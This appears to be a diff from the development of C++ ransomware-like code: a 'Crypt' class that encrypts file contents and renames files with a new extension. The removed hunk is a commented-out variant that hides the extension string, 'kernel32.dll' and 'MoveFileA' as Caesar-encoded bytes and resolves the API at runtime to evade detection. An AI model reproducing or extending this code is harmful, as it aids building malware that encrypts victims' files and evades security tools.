@@ -68,40 +68,6 @@ VOID Crypt::_change_extension(const fs::directory_entry& file) {
 	return;
 }
 
-//VOID Crypt::_change_extension(const fs::directory_entry& file) {
-//	// Decrypt the extension and kernel32.dll string
-//	std::vector<unsigned char> loc_extension = { 0x0c, 0x4a, 0x4d, 0x41 };
-//	std::string new_extension = this->decryptCaesar(loc_extension, 0xDE);
-//
-//	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
-//	std::string kernel32_str = this->decryptCaesar(kernel32, 0xDE);
-//
-//	// File paths
-//	fs::path filePath = file.path();
-//	fs::path newFilePath = filePath;
-//	newFilePath.replace_extension(filePath.extension().string() + new_extension);
-//
-//	// Convert file paths to C-strings
-//	std::string oldPathStr = filePath.string();
-//	std::string newPathStr = newFilePath.string();
-//
-//	// Load kernel32.dll and resolve MoveFileA
-//	HMODULE hKernel32 = LoadLibraryA(kernel32_str.c_str());
-//	if (hKernel32) {
-//		std::vector<unsigned char> moveFileA = { 0x2b, 0x4d, 0x54, 0x43, 0x24, 0x47, 0x4a, 0x43, 0x1f };
-//		std::string moveFileA_str = this->decryptCaesar(moveFileA, 0xDE);
-	//
-//		MoveFileA_t pMoveFileA = (MoveFileA_t)GetProcAddress(hKernel32, moveFileA_str.c_str());
-//		if (pMoveFileA) {
-//			// Rename the file using MoveFileA
-//			pMoveFileA(oldPathStr.c_str(), newPathStr.c_str());
-//		}
-//		FreeLibrary(hKernel32);
-//	}
-//
-//	return;
-//}
-
 std::vector<char> Crypt::encryptBytes(const fs::directory_entry& file) {
 	std::ifstream entry(file.path().string(), std::ios::binary);
 
